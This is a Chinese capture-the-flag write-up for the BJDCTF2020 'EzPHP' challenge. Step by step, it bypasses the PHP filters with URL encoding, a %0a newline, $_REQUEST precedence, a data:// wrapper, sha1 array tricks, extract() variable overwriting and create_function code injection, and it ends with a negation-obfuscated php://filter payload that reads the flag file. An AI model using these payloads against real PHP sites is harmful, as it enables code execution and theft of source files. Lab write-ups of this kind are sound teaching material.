# [BJDCTF2020]EzPHP 许多的特性

这道题可以学到很多东西 静下心来慢慢通过本地知道是干嘛用的就可以学会了

 [BJDctf2020 Ezphp_[bjdctf2020]ezphp-CSDN博客](https://blog.csdn.net/qq_62984336/article/details/123474203) 

这里开始

一部分一部分看

## $_SERVER['QUERY_SRING']的漏洞

```cobol
if($_SERVER) { 
    if (
        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
        )  
        // print_r($_SERVER['QUERY_STRING']);
        die('You seem to want to do something bad?'); 
}

```

这里是出现这些内容我们就报错

这里使用url编码绕过

```php
$_SERVER['QUERY_STRING']函数不对传入的东西进行url编码
```

所以我们传入什么就是什么 但是最后到服务端还是会解码

然后我们看下面

## 绕过preg_match %0a

```cobol
if (!preg_match('/http|https/i', $_GET['file'])) {
    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
        $file = $_GET["file"]; 
        echo "Neeeeee! Good Job!<br>";
    } 
} else die('fxck you! What do you want to do ?!');
```

这里首先file不能使用http然后需要debu传入 aqua_is_cute 但是不能等于

这里很简单 使用 %0a绕过即可

所以目前的payload

```cobol
?deb%75=aq%75a_is_c%75te%0a
 
 
这里是因为上面的绕过 所以需要url编码
```

继续

## $_REQUEST  特性 post比get先接受参数

```php
if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            die('fxck you! I hate English!'); 
    } 
}  
```

这里是$_REQUEST 的特性 这里会判断 是不是有字母在 $_REQUEST 中

但是我们通过post传递和get传递的时候 POST会被先接受 然后没有字母 就绕过

所以现在是

```cobol
GET
 
?deb%75=aq%75a_is_c%75te%0a
 
 
POST 
 
debu=1
```

## 伪协议data伪造

```cobol
if (file_get_contents($file) !== 'debu_debu_aqua')
    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>"); 
```

这里很简单了

```cobol
GET
 
?deb%75=aq%75a_is_c%75te%0a&file=data://text/plain,deb%75_deb%75_aq%75a
 
 
POST 
 
debu=1&file=2
```

## sha1 === 数组绕过

```cobol
if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
    extract($_GET["flag"]);
    echo "Very good! you know my password. But what is flag?<br>";
} else{
    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
} 
```

没有is_string的判断 不需要碰撞 数组绕过即可

```cobol
GET
 
?deb%75=aq%75a_is_c%75te%0a&file=data://text/plain,deb%75_deb%75_aq%75a&shan%61[]=1&p%61sswd[]=2
 
 
POST 
 
debu=1&file=2   //其他不需要是因为我们没有传入字母了
```

## create_function代码注入

```bash
if(preg_match('/^[a-z0-9]*$/isD', $code) || 
preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
    include "flag.php";
    $code('', $arg); 
} ?>
```

这个也是最难的

首先我们知道create_funtion的代码是什么

```php
$aaa = create_function('$a, $b', 'return $a+$b;');
 
和
 
function aaa($a,$b){
    return $a+$b
}
 
一样
 
但是这里注意 我们现在的arg 其实就是 return $a+$b 并且是可控的 如果我们闭合 代码注入呢
 
 
$aaa = create_function('$a, $b', 'return $a+$b;}想执行的函数()');//
 
就变为了
 
 
function aaa($a,$b){
    return $a+$b;}
想执行的函数();//
}
 
美化一下
 
function aaa($a,$b){
    return $a+$b;
}
想执行的函数();      //}
 
这里我们不就实现了代码注入
```

这里我们就已经知道这道题如何实现了

这里有个问题 我们如何输出呢

这里还要注意上面的

## extract($_GET["flag"]) 变量覆盖

```cobol
 
extract($_GET["flag"])
 
举例子
 
?flag[name]=John&flag[age]=30，
 
那么调用 extract($_GET["flag"]); 
 
 
将会创建两个变量 $name 和 $age，并
 
将它们的值分别设置为 "John" 和 30。
```

所以这里我们可以将flag通过flag来设定值

这样我们可以绕过上面的 数字字母过滤 preg_match 不会匹配到  


所以我们可以构造payload

```cobol
fl%61ag[co%64e]=create_function&fl%61ag[%61rg]=;}();//
```

所以现在的payload

```cobol
GET
 
?deb%75=aq%75a_is_c%75te%0a&file=data://text/plain,deb%75_deb%75_aq%75a&shan%61[]=1&p%61sswd[]=2&fl%61g[co%64e]=create_function&fl%61g[%61rg]=};//
 
 
POST 
 
debu=1&file=2   //其他不需要是因为我们没有传入字母了
```

然后这里我们无法获取到内容 所以我们通过 **get_defined_vars()** 输出页面中的所有变量

## var_dump(get_defined_vars())输出页面所有变量

```cobol
GET
 
?deb%75=aq%75a_is_c%75te%0a&file=data://text/plain,deb%75_deb%75_aq%75a&shan%61[]=1&p%61sswd[]=2&fl%61g[co%64e]=create_function&fl%61g[%61rg]=}var_dump(get_defined_vars());//
 
 
POST 
 
debu=1&file=2   //其他不需要是因为我们没有传入字母了
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/9ea4fbaa00af095af832b19b6faf1e2b.png" alt="" style="max-height:177px; box-sizing:content-box;" />


去访问



<img src="https://i-blog.csdnimg.cn/blog_migrate/1fea22950bce995d0f35c9fad5800535.png" alt="" style="max-height:111px; box-sizing:content-box;" />


直接读取源代码

通过文件包含和伪协议实现读取

```cobol
require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php);
 
然后这里过滤了很多
 
我们可以和无回显rce一样 取反操作实现
 
 
}require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//
```

所以最后的payload

```cobol
GET
 
?deb%75=aq%75a_is_c%75te%0a&file=data://text/plain,deb%75_deb%75_aq%75a&shan%61[]=1&p%61sswd[]=2&fl%61g[co%64e]=create_function&fl%61g[%61rg]=
}require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//
 
 
POST 
 
debu=1&file=2   //其他不需要是因为我们没有传入字母了
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/7da1f53c3ae6085cfd0a872c1acef80a.png" alt="" style="max-height:684px; box-sizing:content-box;" />


然后可以发现获取到了flag